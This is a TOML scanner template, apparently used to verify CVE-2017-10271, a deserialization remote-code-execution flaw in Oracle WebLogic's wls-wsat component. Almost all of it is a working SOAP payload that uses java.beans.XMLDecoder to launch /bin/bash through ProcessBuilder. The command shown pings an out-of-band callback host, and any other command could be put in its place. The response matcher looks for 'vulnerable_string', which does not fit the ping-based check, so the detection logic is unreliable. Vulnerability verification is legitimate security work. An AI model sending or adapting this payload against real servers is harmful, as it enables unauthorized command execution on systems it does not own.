[info]
author = "ave"
description = "Oracle WebLogic Server wls-wsat 组件 XMLDecoder 反序列化远程代码执行漏洞验证"
id = "POC-AVE-2017-0200"
name = "CVE-2017-10271 PoC"
severity = "high"
tags = ["ave-2017-0200"]
vuln_id = [
    "CVE-2017-10271",
    "AVE-2017-0200",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/wls-wsat/CoordinatorPortType"
protocol = "http"

[poc.requests.body]
content = """
<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.4.0" class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>ping -c 1 {{interactsh-url}}</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>"""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["vulnerable_string"]

